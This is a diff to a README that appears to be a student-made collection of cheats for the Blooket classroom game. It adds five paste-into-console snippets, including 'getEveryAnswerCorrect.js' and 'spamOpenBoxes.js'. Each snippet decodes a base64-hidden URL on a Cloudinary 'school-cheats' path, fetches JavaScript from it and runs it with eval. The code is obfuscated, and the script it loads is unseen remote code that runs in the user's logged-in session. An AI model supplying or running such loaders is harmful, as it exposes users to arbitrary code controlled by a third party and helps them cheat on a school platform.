@@ -9,7 +9,40 @@ les pro                                 (made by a student who named jack and he
 # Here are the big juicy hecks collection
 these are all useful bookmarklets,paste them into bookmark, make sure javascript: are in the initial.
 
+# bypassRandomName.js
 
+Open console (ctrl + shift + j) and paste the following:
+```js
+fetch(atob('aHR0cHM6Ly9yZXMuY2xvdWRpbmFyeS5jb20vc2Nob29sLWNoZWF0cy9yYXcvdXBsb2FkL3YxNjM3NDUyMjEzL2dsb2JhbEJ5cGFzc1JhbmRvbU5hbWUuanM=')).then((res) => res.text().then((t) => eval(t)))
+```
+
+# getAllBlooksInGame.js
+
+Open console (ctrl + shift + j) and paste the following:
+```js
+fetch(atob('aHR0cHM6Ly9yZXMuY2xvdWRpbmFyeS5jb20vc2Nob29sLWNoZWF0cy9yYXcvdXBsb2FkL3YxNjM3NDUyMjEzL2dsb2JhbEdldEFsbEJsb29rcy5qcw==')).then((res) => res.text().then((t) => eval(t)))
+```
+
+# getEveryAnswerCorrect.js
+
+Open console (ctrl + shift + j) and paste the following:
+```js
+fetch(atob('aHR0cHM6Ly9yZXMuY2xvdWRpbmFyeS5jb20vc2Nob29sLWNoZWF0cy9yYXcvdXBsb2FkL3YxNjM3NDUyMjEzL2dsb2JhbEV2ZXJ5QW5zd2VyQ29ycmVjdC5qcw==')).then((res) => res.text().then((t) => eval(t)))
+```
+
+# spamOpenBoxes.js
+
+Open console (ctrl + shift + j) and paste the following:
+```js
+fetch(atob('aHR0cHM6Ly9yZXMuY2xvdWRpbmFyeS5jb20vc2Nob29sLWNoZWF0cy9yYXcvdXBsb2FkL3YxNjM3NDUyMjEzL2dsb2JhbFNwYW1PcGVuQm94ZXMuanM=')).then((res) => res.text().then((t) => eval(t)))
+```
+
+# sellDupeBlooks.js
+
+Open console (ctrl + shift + j) and paste the following:
+```js
+fetch(atob('aHR0cHM6Ly9yZXMuY2xvdWRpbmFyeS5jb20vc2Nob29sLWNoZWF0cy9yYXcvdXBsb2FkL3YxNjM3NDY2OTM2L2dsb2JhbFNlbGxEdXBlQmxvb2tzLmpz')).then((res) => res.text().then((t) => eval(t)))
+```
 # view all blooks?😳
 just all blooks
 ```js
